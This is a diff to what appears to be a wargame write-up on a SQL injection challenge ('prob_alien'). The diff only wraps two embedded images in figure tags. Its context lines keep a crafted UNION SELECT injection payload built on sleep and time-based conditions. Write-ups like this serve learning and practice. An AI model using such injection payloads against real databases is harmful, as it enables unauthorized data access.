@@ -4,7 +4,9 @@ sidebar_position: 32
 tags: [SQLi, Self-modification]
 ---
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/Kunull/Write-ups/assets/110326359/d4c56057-01fa-4f0c-8360-441f987427c3)
+</figure>
 
 We are provided with the SQL queries:
 
@@ -68,4 +70,6 @@ The resultant first query becomes:
 SELECT id FROM prob_alien WHERE no=1 UNION SELECT concat(lower(hex(10+(!sleep(1)&&now()%2=1))),0x646d696e)#' UNION SELECT concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)%23
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Kunull/Write-ups/assets/110326359/ae221b2c-088e-40c2-9bf4-72d563eb8e9c)
+</figure>
